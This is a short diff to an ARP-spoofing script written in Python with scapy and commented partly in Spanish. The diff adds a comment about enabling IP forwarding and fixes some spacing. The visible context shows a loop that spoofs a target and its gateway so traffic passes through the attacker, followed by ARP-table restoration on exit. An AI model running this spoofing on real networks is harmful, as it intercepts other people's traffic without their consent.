@@ -3,7 +3,8 @@
 import scapy.all as scapy
 import time
 
-
+# enable ip forwarding with this command:
+# echo 1 > /proc/sys/net/ipv4/ip_forward
 def get_mac(ip):
 
     # Devuelve la mac usando el protocolo ARP se envia un mensaje de tipo broadcast con la ip
@@ -80,10 +81,11 @@ try:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
         sent_packets_count = sent_packets_count + 2
-        print(" \r [+] Packet sent: " + str(sent_packets_count), end="")
+        print(" \r [+] Packet sent: " + str(sent_packets_count), end = "")
+
         time.sleep(2)
 except KeyboardInterrupt:
 
     print("[+] CTRL + C ..... Reseteando tabla ARP.... espera")
     restore(target_ip, gateway_ip)
-    restore(gateway_ip,target_ip)
+    restore(gateway_ip, target_ip)
